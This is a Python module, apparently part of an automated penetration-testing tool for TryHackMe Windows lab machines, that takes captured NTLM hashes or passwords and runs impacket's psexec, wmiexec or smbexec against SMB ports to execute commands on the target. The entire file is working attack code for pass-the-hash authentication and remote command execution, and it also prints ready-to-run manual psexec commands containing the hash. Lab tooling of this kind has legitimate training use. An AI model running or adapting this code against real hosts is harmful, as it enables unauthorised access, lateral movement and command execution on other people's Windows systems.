"""Pass-the-hash / NTLM authentication against SMB.

Windows THM boxes often don't need a cracked password - a captured or
otherwise-obtained NTLM hash (from config extraction, deserialization,
or a confirmed credential) is enough. If impacket's scripts are on
PATH, shell out to attempt psexec/wmiexec-style pass-the-hash auth and
command execution; otherwise report the finding with the exact manual
command, same convention as bruteforce.py's engine fallback.
"""

import re
import shutil
import subprocess

IMPACKET_SCRIPTS = ["psexec.py", "wmiexec.py", "smbexec.py"]

NTLM_HASH_RE = re.compile(r"^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$")


def which_impacket():
    for script in IMPACKET_SCRIPTS:
        path = shutil.which(script)
        if path:
            return script, path
    return None, None


def is_ntlm_hash(value):
    return bool(NTLM_HASH_RE.match(value or ""))


def attempt_pth(target, username, secret, domain="", command="whoami", report=None):
    """secret may be a cleartext password or an LM:NTLM hash pair
    (auto-detected). Returns command output on apparent success."""
    script, path = which_impacket()
    if not script:
        if report:
            cred_display = secret if is_ntlm_hash(secret) else "<password>"
            report.add_finding(
                "Pass-the-Hash", f"SMB credentials available but impacket not installed: {username}",
                f"Install impacket (pip install impacket) and run manually: "
                f"psexec.py {domain + chr(92) if domain else ''}{username}@{target} "
                f"{'-hashes ' + cred_display if is_ntlm_hash(secret) else ''}",
                "INFO",
            )
        return None

    cmd = [path]
    auth_target = f"{domain + chr(92) if domain else ''}{username}@{target}"
    if is_ntlm_hash(secret):
        cmd += ["-hashes", secret, auth_target]
    else:
        cmd = [path, f"{domain + chr(92) if domain else ''}{username}:{secret}@{target}"]
    cmd += ["-c", command] if script != "psexec.py" else [command]

    try:
        proc = subprocess.run(cmd, capture_output=True, timeout=30, text=True)
        output = (proc.stdout or "") + (proc.stderr or "")
    except Exception as exc:
        output = str(exc)

    success = "error" not in output.lower()[:200] and output.strip() != ""
    if report:
        if success:
            report.add_finding(
                "Pass-the-Hash", f"SMB authentication succeeded via {script}: {username}@{target}",
                f"Command '{command}' executed. Output: {output[:500]}", "CRITICAL",
                vuln_id="ntlm_pth_success",
            )
        else:
            report.add_finding(
                "Pass-the-Hash", f"SMB pass-the-hash attempt failed: {username}@{target}",
                f"{script} output: {output[:300]}", "INFO",
            )
    return output if success else None


def run(target, open_ports, credentials, report=None):
    """credentials: list of {'username','password'} (or NTLM hash in
    'password') dicts already confirmed/extracted elsewhere."""
    if not any(p["port"] in (139, 445) for p in (open_ports or [])):
        return []
    results = []
    for cred in credentials or []:
        output = attempt_pth(target, cred["username"], cred["password"], report=report)
        if output:
            results.append({"username": cred["username"], "output": output})
    return results
